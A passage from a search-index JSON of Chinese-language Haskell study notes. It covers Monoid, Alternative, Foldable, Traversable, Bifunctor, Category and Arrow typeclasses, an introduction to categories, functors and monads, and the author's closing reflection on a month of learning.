]","title":"\u8865\uff1aNonEmpty"},{"location":"cs/pl/haskell/#monoid","text":"\u5e7a\u534a\u7fa4\uff08Monoid\uff09\u662f\u4e00\u4e2a\u6709\u5355\u4f4d\u5143\u7d20 \\(e\\) \u7684\u534a\u7fa4\uff0c\u5373 \\(e\\) \u6ee1\u8db3\uff1a \\[ e\\oplus x = x\\oplus e = x \\] class Semigroup a => Monoid a where mempty :: a mappend :: a -> a -> a mappend = ( <> ) mconcat :: [ a ] -> a mconcat = foldr mappend mempty \u53ef\u4ee5\u770b\u51fa Monoid \u8981\u6c42\u4e86\u4e09\u4e2a\u51fd\u6570\uff0c\u5176\u4e2d\u6700\u5c11\u53ea\u9700\u8981 mempty \uff0c\u5b83\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8868\u793a\u5355\u4f4d\u5143\u7d20\u3002 mappend \u5373 Semigroup \u4e2d\u7684 <> \u8fd0\u7b97\u7b26\uff0c mconcat \u4e5f\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u5b9e\u73b0","title":"Monoid"},{"location":"cs/pl/haskell/#monoid_1","text":"","title":"Monoid \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#monoid-laws","text":"mempty <> x = x x <> mempty = x (x <> y) <> z = x <> (y <> z)","title":"Monoid Laws"},{"location":"cs/pl/haskell/#monoidal-classes","text":"Applicative\u3001Monad\u3001Arrow \u90fd\u6709\u6709\u5e7a\u534a\u7fa4\u6027\u8d28\u7684\u5b50\u7c7b\u578b\u7c7b\uff0c\u5206\u522b\u662f Alternative\u3001MonadPlus\u3001ArrowPlus","title":"Monoidal classes"},{"location":"cs/pl/haskell/#alternative","text":"class Applicative f => Alternative f where -- | The identity of '<|>' empty :: f a -- | An associative binary operation ( <|> ) :: f a -> f a -> f a some :: f a -> f [ a ] some v = ( : ) <$> v <*> many v many :: f a -> f [ a ] many v = some v <|> pure [] \u5176\u4e2d empty \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u5355\u4f4d\u5143\u7d20\uff0c<|> \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u4e8c\u5143\u8fd0\u7b97\u7b26\u3002some \u548c many \u662f\u4e24\u4e2a\u51fd\u6570\uff08 \u610f\u4e49\u8fd8\u4e0d\u61c2 \uff09","title":"Alternative"},{"location":"cs/pl/haskell/#monadplus","text":"class ( Alternative m , Monad m ) => MonadPlus m where mzero :: m a mzero = empty mplus :: m a -> m a -> m a mplus = ( <|> )","title":"MonadPlus"},{"location":"cs/pl/haskell/#arrowplus","text":"ArrowZero \u548c ArrowPlus \u5206\u522b\u4e3a Arrow \u8bbe\u7f6e\u4e86 Monoid \u4e2d\u7684\u5355\u4f4d\u5143\u7d20\u548c\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0c\u4f7f\u4e4b\u6210\u4e3a\u4e86\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a class Arrow arr => ArrowZero arr where zeroArrow :: b ` arr ` c class ArrowZero arr => ArrowPlus arr where ( <+> ) :: ( b ` arr ` c ) -> ( b ` arr ` c ) -> ( b ` arr ` c )","title":"ArrowPlus"},{"location":"cs/pl/haskell/#typeclasses_1","text":"","title":"\u4e00\u4e9b\u5176\u5b83 Typeclasses"},{"location":"cs/pl/haskell/#foldable","text":"Foldable \u662f\u8868\u793a\u53ef\u4ee5\u6298\u53e0\uff08fold\uff09\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Foldable \u4e2d\u5b9a\u4e49\uff0c\u8fd9\u4f7f\u5f97\u548c fold \u76f8\u5173\u7684\u51fd\u6570\u53ef\u4ee5\u7528\u5728\u4efb\u610f Foldable \u7684\u5b9e\u4f8b\u7c7b\u578b\u4e0a\u3002\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class Foldable t where fold :: Monoid m => t m -> m foldMap :: Monoid m => ( a -> m ) -> t a -> m foldMap' :: Monoid m => ( a -> m ) -> t a -> m foldr :: ( a -> b -> b ) -> b -> t a -> b foldr' :: ( a -> b -> b ) -> b -> t a -> b foldl :: ( b -> a -> b ) -> b -> t a -> b foldl' :: ( b -> a -> b ) -> b -> t a -> b foldr1 :: ( a -> a -> a ) -> t a -> a foldl1 :: ( a -> a -> a ) -> t a -> a toList :: t a -> [ a ] null :: t a -> Bool length :: t a -> Int elem :: Eq a => a -> t a -> Bool maximum :: Ord a => t a -> a minimum :: Ord a => t a -> a sum :: Num a => t a -> a product :: Num a => t a -> a {-# MINIMAL foldMap | foldr #-} \u6700\u5c11\u53ea\u8981\u5b9e\u73b0 foldr \u548c foldMap \u5176\u4e2d\u4e4b\u4e00\u5c31\u53ef\u4ee5\u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff0c\u5176\u5b83\u7684\u51fd\u6570\u90fd\u6709\u7531\u8fd9\u4e24\u4e2a\u51fd\u6570\u63d0\u4f9b\u7684\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u800c\u4e14\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e4b\u95f4\u4e5f\u6709\u76f8\u4e92\u5b9e\u73b0\u3002\u56e0\u6b64\u53ea\u8981\u5b9e\u73b0 foldr \u6216 foldMap \u4e00\u4e2a\u51fd\u6570\u5c31\u53ef\u4ee5\u4f7f\u7528\u6240\u6709\u5176\u5b83 Foldable \u4e2d\u7684\u51fd\u6570\u3002foldr \u51fd\u6570\u5728\u524d\u9762\u5df2\u7ecf\u6709\u5b66\u8fc7\uff0cfoldMap \u7684\u4f8b\u5b50\u662f\uff1a ghci > foldMap Sum [ 1 , 3 , 5 ] Sum { getSum = 9 } ghci > foldMap Product [ 1 , 3 , 5 ] Product { getProduct = 15 } ghci > foldMap ( replicate 3 ) [ 1 , 2 , 3 ] [ 1 , 1 , 1 , 2 , 2 , 2 , 3 , 3 , 3 ]","title":"Foldable"},{"location":"cs/pl/haskell/#traversable","text":"Traversable \u662f\u8868\u793a\u53ef\u904d\u5386\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Traversable \u6a21\u5757\u4e2d\u5b9a\u4e49\uff0c\u5b83\u662f Foldable \u7684\u5347\u7ea7\u7248\uff0c\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a Functor\uff0c\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class ( Functor t , Foldable t ) => Traversable t where traverse :: Applicative f => ( a -> f b ) -> t a -> f ( t b ) sequenceA :: Applicative f => t ( f a ) -> f ( t a ) mapM :: Monad m => ( a -> m b ) -> t a -> m ( t b ) sequence :: Monad m => t ( m a ) -> m ( t a ) {-# MINIMAL traverse | sequenceA #-} \u6700\u5c11\u53ea\u9700\u8981\u5b9e\u73b0 traverse \u51fd\u6570\u6216\u8005 sequenceA \u51fd\u6570\u3002\u5176\u4e2d\u5404\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u901a\u8fc7\u7c7b\u578b\u7b7e\u540d\u4e5f\u90fd\u80fd\u63a8\u6d4b\u51fa\u6765\u3002\u4f46\u662f\u5176\u4e2d mapM \u5c31\u662f traverse\uff0csequence \u5c31\u662f sequenceA\uff0c\u5b83\u4eec\u5b58\u5728\u53ea\u662f\u5386\u53f2\u9057\u7559","title":"Traversable"},{"location":"cs/pl/haskell/#bifunctor","text":"Functor \u7684\u5b9e\u4f8b\u7684 kind \u90fd\u662f * -> *\uff0c\u56e0\u6b64 fmap \u53ea\u80fd\u5c06\u4e00\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u4e0a\u3002\u800c Bifunctor\uff08\u5728 Data.Bifunctor \u6a21\u5757\u4e2d\u5b9a\u4e49\uff09\u7684\u5b9e\u4f8b\u7684 kind \u662f * -> * -> *\uff0c\u800c\u4e14\u5b83\u7684 bimap \u53ef\u4ee5\u540c\u65f6\u5c06\u4e24\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e24\u4e2a\u503c\u4e0a\uff1a class Bifunctor p where bimap :: ( a -> b ) -> ( c -> d ) -> p a c -> p b d first :: ( a -> b ) -> p a c -> p b c second :: ( b -> c ) -> p a b -> p a c {-# MINIMAL bimap | first, second #-} \u540c\u65f6 bimap \u548c first,second \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\uff1a bimap f g = first f . second g first f = bimap f id second g = bimap id g \u5bf9\u4e8e Functor\uff0c((,) e) \u548c Either e \u624d\u662f Functor \u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a\u4ed6\u4eec\u662f * -> *\u3002\u4f46\u662f\u5bf9\u4e8e Bifunctor\uff0c(,) \u548c Either \u5c31\u662f Bifunctor \u7684\u5b9e\u4f8b\uff1a ghci > bimap ( + 1 ) length ( 4 , [ 1 , 2 , 3 ]) ( 5 , 3 )","title":"Bifunctor"},{"location":"cs/pl/haskell/#category","text":"Haskell \u4e2d\u7684 Category \u5c06\u4e00\u822c\u7684\u51fd\u6570\u63a8\u5e7f\u5230\u4e86\u666e\u904d\u7684\u6001\u5c04\u4e0a\uff0c\u5b83\u5728 Control.Category \u6a21\u5757\u4e2d\uff0c\u5b9a\u4e49\u662f\uff1a class Category cat where id :: cat a a ( . ) :: cat b c -> cat a b -> cat a c \u5b83\u7684\u5b9e\u4f8b\u6709 (->) \u548c Kleisli m \uff1a instance Category ( -> ) where id = GHC . Base . id ( . ) = ( GHC . Base .. ) Kleisli \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u7528\u6765\u8868\u793a\u51fd\u6570 a -> m b\uff0cHaskell \u4e2d\uff0c\u5b83\u5728 Control.Arrow \u6a21\u5757\u4e2d\u5b9a\u4e49\uff1a newtype Kleisli m a b = Kleisli { runKleisli :: a -> m b } instance Monad m => Category ( Kleisli m ) where id :: Kleisli m a a id = Kleisli return ( . ) :: Kleisli m b c -> Kleisli m a b -> Kleisli m a c Kleisli g . Kleisli h = Kleisli ( h >=> g ) Category \u8981\u6ee1\u8db3\u7684\u5b9a\u5f8b\u53ea\u6709 id \u662f (.) \u64cd\u4f5c\u7684\u5355\u4f4d\u5143\uff0c\u4ee5\u53ca (.) \u64cd\u4f5c\u662f\u53ef\u7ed3\u5408\u7684 \u540c\u65f6 Category \u8fd8\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570 <<< \u548c >>> \uff1a ( <<< ) :: Category cat => cat b c -> cat a b -> cat a c ( <<< ) = ( . ) ( >>> ) :: Category cat => cat a b -> cat b c -> cat a c f >>> g = g . f","title":"Category"},{"location":"cs/pl/haskell/#arrow","text":"Arrow \u5c06\u51fd\u6570\u8fdb\u4e00\u6b65\u62bd\u8c61\u5316\uff0c\u5b83\u5b9a\u4e49\u5728 Control.Arrow \u6a21\u5757\u4e2d\uff1a class Category a => Arrow a where arr :: ( b -> c ) -> a b c first :: a b c -> a ( b , d ) ( c , d ) second :: a b c -> a ( d , b ) ( d , c ) ( *** ) :: a b c -> a b' c' -> a ( b , b' ) ( c , c' ) ( &&& ) :: a b c -> a b c' -> a b ( c , c' ) {-# MINIMAL arr, (first | (***)) #-} \u5176\u4e2d\uff1a arr \u51fd\u6570\u5c06\u4e00\u4e2a\u51fd\u6570\u53d8\u6210\u4e00\u4e2a Arrow first \u51fd\u6570\u5c06\u4e00\u4e2a Arrow \u53d8\u6210\u4e00\u4e2a\u4e8c\u5143\u7ec4\u95f4\u7684 Arrow\uff0c\u4e14\u53ea\u4f1a\u5bf9\u4e00\u4e2a\u5143\u7d20\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 second \u51fd\u6570\u4e0e first \u76f8\u53cd\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 *** \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 parallel composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g *** h) (x, y) = (g x, h y) &&& \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 fanout composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g &&& h) x = (g x, h x) \u5b83\u7684\u5b9e\u4f8b\u4e5f\u6709 (->) \u548c Kleisli\uff1a instance Arrow ( -> ) where arr :: ( b -> c ) -> ( b -> c ) arr g = g first :: ( b -> c ) -> (( b , d ) -> ( c , d )) first g ( x , y ) = ( g x , y ) instance Monad m => Arrow ( Kleisli m ) where arr :: ( b -> c ) -> Kleisli m b c arr f = Kleisli ( return . f ) first :: Kleisli m b c -> Kleisli m ( b , d ) ( c , d ) first ( Kleisli f ) = Kleisli ( \\ ~ ( b , d ) -> do c <- f b return ( c , d ) ) \u5e38\u7528\u51fd\u6570\uff1a returnA :: Arrow a => a b b returnA = arr id ( ^>> ) :: Arrow a => ( b -> c ) -> a c d -> a b d f ^>> a = arr f >>> a ( >>^ ) :: Arrow a => a b c -> ( c -> d ) -> a b d a >>^ f = a >>> arr f ( <<^ ) :: Arrow a => a c d -> ( b -> c ) -> a b d a <<^ f = a <<< arr f ( ^<< ) :: Arrow a => ( c -> d ) -> a b c -> a b d f ^<< a = arr f <<< a","title":"Arrow"},{"location":"cs/pl/haskell/#haskell_1","text":"Haskell \u4e2d\u7684\u51fd\u5b50\u5355\u5b50\u7b49\u90fd\u4e0e\u8303\u7574\u8bba\uff08category theory\uff09\u6709\u5f88\u591a\u8054\u7cfb\uff0c\u6240\u4ee5\u6253\u7b97\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u8303\u7574\u8bba\u7684\u76f8\u5173\u5185\u5bb9\u3002 \u8303\u7574\u8bba \u662f\u6570\u5b66\u7684\u4e00\u95e8\u5b66\u79d1\uff0c\u4ee5\u62bd\u8c61\u7684\u65b9\u6cd5\u5904\u7406\u6570\u5b66\u6982\u5ff5\uff0c\u5c06\u8fd9\u4e9b\u6982\u5ff5\u5f62\u5f0f\u5316\u6210\u4e00\u7ec4\u7ec4\u7684\u201c\u7269\u4ef6\u201d\u53ca\u201c\u6001\u5c04\u201d\u3002\u6570\u5b66\u4e2d\u8bb8\u591a\u91cd\u8981\u7684\u9886\u57df\u53ef\u4ee5\u5f62\u5f0f\u5316\u4e3a\u8303\u7574\u3002\u4f7f\u7528\u8303\u7574\u8bba\u53ef\u4ee5\u4ee4\u8fd9\u4e9b\u9886\u57df\u4e2d\u8bb8\u591a\u96be\u7406\u89e3\u3001\u96be\u6349\u6478\u7684\u6570\u5b66\u7ed3\u8bba\u66f4\u5bb9\u6613\u53d9\u8ff0\u8bc1\u660e\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1","title":"Haskell \u4e0e\u8303\u7574\u8bba"},{"location":"cs/pl/haskell/#category_1","text":"\u8303\u7574\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u96c6\u5408\uff0c\u4e00\u4e2a\u8303\u7574 \\(\\mathbf{C}\\) \u5305\u542b\u4e09\u4e2a\u7ec4\u6210\u6210\u5206\uff1a \u4e00\u4e2a\u7c7b \\(\\mathrm{ob}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u5bf9\u8c61\uff08objects\uff09 \u4e00\u4e2a\u7c7b \\(\\mathrm{hom}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u6001\u5c04\uff08morphisms\uff09 \uff08\u6216 \u7bad\u53f7\uff08arrows\uff09 \uff09\uff1a\u6bcf\u4e2a\u6001\u5c04\u8fde\u63a5\u4e86\u4e24\u4e2a\u5bf9\u8c61\uff1a\u6e90\u5bf9\u8c61\uff08source object\uff09\u3001\u76ee\u6807\u5bf9\u8c61\uff08target object\uff09\u3002\u5982\u679c \\(f\\) \u662f\u4ece\u6e90\u5bf9\u8c61 \\(A\\) \u5230\u76ee\u6807\u5bf9\u8c61 \\(B\\) \uff08 \\(A, B\\in \\mathrm{ob}(\\mathbf{C})\\) \uff09\u7684\u6001\u5c04\uff0c\u90a3\u4e48\u8bb0\u4e3a \\(f : A\\to B\\) \u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\uff0c\u79f0\u4e3a\u6001\u5c04 \u590d\u5408\uff08composition\uff09 \uff1a\u4e24\u4e2a\u6001\u5c04 \\(g : A\\to B\\) \u3001 \\(f : B\\to C\\) \u7684\u590d\u5408\u8bb0\u4e3a \\(f\\circ g : A\\to C\\) \u5728 Haskell \u548c\u5927\u90e8\u5206\u6570\u5b66\u7406\u8bba\u4e2d\u90fd\u662f\u4ece\u53f3\u5411\u5de6\u8ba1\u7b97\uff0c\u5373 \\(f\\circ g\\) \u4e2d\u662f\u5148\u8ba1\u7b97 \\(g : A\\to B\\) \u518d\u8ba1\u7b97 \\(f : B\\to C\\) \u8bb8\u591a\u4e1c\u897f\u90fd\u53ef\u4ee5\u7ec4\u6210\u8303\u7574\u3002\u6bd4\u5982: \u4f8b \u2003 \\(\\mathbf{Set}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u96c6\u5408\uff0c\u6001\u5c04\u4e3a\u96c6\u5408\u4e4b\u95f4\u7684\u51fd\u6570\uff0c\u590d\u5408\u5373\u51fd\u6570\u4e4b\u95f4\u7684\u590d\u5408 \u2003 \\(\\mathbf{Grp}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u7fa4\uff0c\u6001\u5c04\u4e3a\u7fa4\u540c\u6001\uff08group homomorphisms\uff09\uff0c\u4f8b\u5982\u5bf9\u4e8e\u7fa4 \\((G,*)\\) \u548c \\((H,\\cdot )\\) \uff0c\u6709\u7fa4\u540c\u6001 \\(h : (G,*)\\to (H,\\cdot )\\) \uff0c\u5219\u9700\u8981\u5bf9\u4e8e \\(G\\) \u4e2d\u7684\u4efb\u610f\u5143\u7d20 \\(u,v\\) \u6ee1\u8db3 \\[h(u*v)=h(u)\\cdot h(v)\\] \u6ce8\u610f \u6001\u5c04\u4e0d\u5fc5\u987b\u4e3a\u51fd\u6570\uff1b\u800c\u4e14\u53ef\u4ee5\u5b58\u5728\u6e90\u5bf9\u8c61\u548c\u76ee\u6807\u5bf9\u8c61\u90fd\u76f8\u540c\u7684\u4e0d\u540c\u6001\u5c04","title":"\u8303\u7574\uff08Category\uff09"},{"location":"cs/pl/haskell/#functors_1","text":"\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u5c06\u4e24\u4e2a\u5bf9\u8c61\u8054\u7cfb\u8d77\u6765\uff0c\u800c\u51fd\u5b50\u5219\u4f1a\u5c06\u4e24\u4e2a\u8303\u7574\u8054\u7cfb\u8d77\u6765\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u51fd\u5b50\u5c31\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u3001 \\(\\mathbf{D}\\) \uff0c\u5b9a\u4e49\u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u6ee1\u8db3\uff1a \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u5bf9\u8c61 \\(A\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u5bf9\u8c61 \\(F(A)\\) \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u6001\u5c04 \\(f : A\\to B\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u6001\u5c04 \\(F(f) : F(A)\\to F(B)\\) \u4f8b \u9057\u5fd8\u51fd\u5b50\uff08forgetful functor\uff09 \\(U : \\mathbf{Grp}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u7fa4\u6620\u5c04\u5230\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u5c06\u7fa4\u540c\u6001\u6620\u5c04\u5230\u96c6\u5408\u95f4\u7684\u51fd\u6570 \u5e42\u96c6\u51fd\u5b50\uff08power set functor\uff09 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u96c6\u5408\u6620\u5c04\u5230\u5b83\u7684\u5e42\u96c6\uff0c\u5c06\u539f\u96c6\u5408\u4e2d\u7684\u51fd\u6570 \\(f : A\\to B\\) \u6620\u5c04\u5230\u51fd\u6570 \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) \uff0c\u5373\u4ece \\(U\\subseteq A\\) \u5230\u503c\u57df \\(f(U)\\subseteq B\\) \u7684\u6620\u5c04 \u81ea\u51fd\u5b50\uff08endofunctor\uff09 \\(1_{\\mathbf{C}} : \\mathbf{C}\\to\\mathbf{C}\\) \uff0c\u5c06\u4e00\u4e2a\u8303\u7574\u6620\u5c04\u5230\u5b83\u672c\u8eab","title":"\u51fd\u5b50\uff08Functors\uff09"},{"location":"cs/pl/haskell/#monads","text":"\u4e00\u4e2a\u5355\u5b50\u8bf4\u767d\u4e86\u4e0d\u8fc7\u5c31\u662f\u81ea\u51fd\u5b50\u8303\u7574\u4e0a\u7684\u4e00\u4e2a\u5e7a\u534a\u7fa4\u800c\u5df2 _(:\u0437\u300d\u2220)_ \u81ea\u51fd\u5b50\u5728\u524d\u9762\u8bf4\u5230\u8fc7\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u81ea\u8eab\u7684\u4e00\u4e2a\u51fd\u5b50\uff0c\u5982\u8303\u7574 \\(\\mathbf{C}\\) \u4e0a\u7684\u81ea\u51fd\u5b50\u662f \\(F : \\mathbf{C}\\to\\mathbf{C}\\) \u3002\u81ea\u51fd\u5b50\u8303\u7574\u5c31\u662f\u5bf9\u8c61\u90fd\u662f\u81ea\u51fd\u5b50\u7684\u8303\u7574\u3002\u5e7a\u534a\u7fa4\u548c Haskell \u4e2d\u5b66\u5230\u7684 Monoid \u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u662f\u4e00\u4e2a\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\u548c\u5355\u4f4d\u5143\u7684\u4ee3\u6570\u7ed3\u6784\u3002\u56e0\u6b64\u5355\u5b50\u5c31\u662f\u4e00\u4e2a\u81ea\u51fd\u5b50\uff0c\u800c\u4e14\u5b83\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\uff08Haskell \u4e2d >=> \uff09\u548c\u5355\u4f4d\u5143\uff08Haskell \u4e2d return \uff09\u3002 \u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \u8fd8\u5305\u542b\u4e24\u4e2a\u6001\u5c04\uff08\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u6240\u6709\u5bf9\u8c61 \\(X\\) \uff09\uff1a \\(\\mathrm{unit}_X^M : X\\to M(X)\\) \\(\\mathrm{join}_X^M : M(M(X))\\to M(X)\\) \uff08\u5f53\u5f0f\u5b50\u4e2d\u7684\u5355\u5b50\u660e\u663e\u662f \\(M\\) \u65f6\uff0c\u53ef\u4ee5\u7701\u7565\u4e0a\u6807 \\({}^M\\) \uff09 Haskell \u4e2d Monad \u7684\u5b9a\u4e49\u662f\uff1a class Functor m => Monad m where return :: a -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b \u5176\u4e2d\u5f88\u663e\u7136\u591a\u6001\u51fd\u6570 return \u5bf9\u5e94\u4e86\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{unit}\\) \uff0c\u4f46\u662f >>= \u548c \\(\\mathrm{join}\\) \u7684\u5bf9\u5e94\u5173\u7cfb\u5e76\u4e0d\u660e\u663e\u3002\u56e0\u6b64 Haskell \u4e2d\u6709\u4e00\u4e2a\u5de5\u5177\u51fd\u6570 join \uff0c\u5b83\u7684\u6548\u679c\u5c31\u662f\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{join}\\) \uff0c\u800c\u4e14\u5b83\u53ef\u4ee5\u548c >>= \u4e92\u76f8\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u6240\u4ee5 Haskell \u4e2d\u4e3a Monad \u8981\u6c42\u5b9a\u4e49 >>= \u5c31\u76f8\u5f53\u4e8e\u5b9a\u4e49\u4e86 \\(\\mathrm{join}\\) \u4f8b\u5982\uff0c\u5e42\u96c6\u51fd\u5b50 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u53ef\u4ee5\u4e3a\u5b83\u5b9a\u4e49 \\(\\mathrm{unit}\\) \u548c \\(\\mathrm{join}\\) \u4e24\u4e2a\u6001\u5c04\u3002Haskell \u4e2d\u7684\u5217\u8868\u4e5f\u53ef\u4ee5\u8fd1\u4f3c\u770b\u4f5c\u5e42\u96c6\u51fd\u5b50\u3002 \u6001\u5c04/\u51fd\u6570\u7684\u7c7b\u578b \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \u4e00\u4e2a\u96c6\u5408 \\(S\\) \u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \u4e00\u4e2a\u7c7b\u578b T \u548c\u4e00\u4e2a\u51fd\u6570 f :: A -> B \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) fmap f :: [A] -> [B] \\(\\mathrm{unit}_S : S\\to\\mathcal{P}(S)\\) return :: T -> [T] \\(\\mathrm{join}_S : \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)\\) join :: [[T]] -> [T] \u6001\u5c04/\u51fd\u6570\u7684\u5b9a\u4e49 \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \\((\\mathcal{P}(f))(S) = \\\\{f(a):a\\in S\\\\}\\) fmap f xs = [ f a | a <- xs ] \\(\\mathrm{unit}_S(x) = \\\\{x\\\\}\\) return x = [x] \\(\\mathrm{join}_S(L) = \\bigcup L\\) join xs = concat xs","title":"\u5355\u5b50\uff08Monads\uff09"},{"location":"cs/pl/haskell/#_30","text":"\u5543\u4e86\u5c06\u8fd1\u4e00\u4e2a\u6708\uff0c\u7b97\u662f\u628a Haskell \u7684\u4e3b\u8981\u5185\u5bb9\u90fd\u5543\u5b8c\u4e86\u3002\u4e3b\u8981\u5c31\u662f\u524d\u671f\u770b Learn You a Haskell \uff0c\u540e\u671f\u770b Typeclassopedia \uff0c\u90fd\u662f pdcxs \u63a8\u8350\u7ed9\u7684\u6559\u7a0b\u3002\u4f46\u662f\u4e00\u5806\u89c6\u9891\u4e00\u4e2a\u90fd\u6ca1\u6709\u8010\u5fc3\u770b\u8fdb\u53bbqwq \u540e\u9762\u7684\u90e8\u5206\u7684\u7406\u89e3\u611f\u89c9\u4e5f\u6ca1\u5230\u4f4d\uff0cCategory\u3001Arrow \u7b49\u8fd9\u4e9b\u7c7b\u578b\u7c7b\u4e5f\u5c31\u662f\u5927\u81f4\u5730\u770b\u4e86\u4e00\u773c\uff0c\u751a\u81f3\u6709\u4ec0\u4e48\u7528\u90fd\u4e0d\u592a\u6e05\u695a_(:\u0437\u300d\u2220)_ \u611f\u89c9 Haskell \u8fd9\u95e8\u8bed\u8a00\u786e\u5b9e\u5f88\u795e\u5947\uff0c\u5f88\u591a\u8bed\u6cd5\u90fd\u5f88\u6709\u610f\u601d\uff0c\u800c\u4e14\u53ef\u4ee5\u505a\u5230\u975e\u5e38\u8d34\u8fd1\u6570\u5b66\u3001\u8d34\u8fd1\u6570\u5b66\u6982\u5ff5\u3002\u5b66\u7684\u65f6\u5019\u4e5f\u662f\u8d8a\u5b66\u5751\u8d8a\u591a\uff0c\u5148\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u5f15\u7533\u5230\u4e86 lambda \u6f14\u7b97\uff0c\u7136\u540e\u662f\u51fd\u5b50\u7b49\u4e00\u7cfb\u5217\u6982\u5ff5\u5f15\u7533\u5230\u4e86\u8303\u7574\u8bba\uff0c\u76ee\u524d\u8303\u7574\u8bba\u7b80\u5355\u5730\u770b\u4e86\u4e00\u90e8\u5206\uff0clambda \u6f14\u7b97\u4e5f\u6ca1\u6df1\u5165\u7814\u7a76\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u8bf4\u4e86\uff08\u5495\u5495\u5495\uff09 \u73b0\u5728\u611f\u89c9\u6211\u5b66\u5230\u7684 Haskell \u7b80\u76f4\u662f\u76ae\u6bdb\uff0c\u8fd8\u6709\u4e00\u5806\u6e90\u7801\u91cc\u7684\u4e1c\u897f\u4e0d\u77e5\u9053\u662f\u600e\u4e48\u56de\u4e8b\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e#\uff0c~\uff09\uff0c\u4e5f\u8fd8\u6709\u4e00\u5806\u7c7b\u578b\u7c7b\u548c\u7528\u6cd5\u6ca1\u6709\u5b66\u5230\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e Monad Transformer\u3001Writer\u3001Reader\u3001State\u3001Comonad\u3001MonadFix\u3001Lens\u3001Parsec\u3001\u2026\u2026\uff09 md\uff0c\u8fd9\u4e48\u4e00\u770b\u5dee\u7684\u8fd8\u771f\u591a 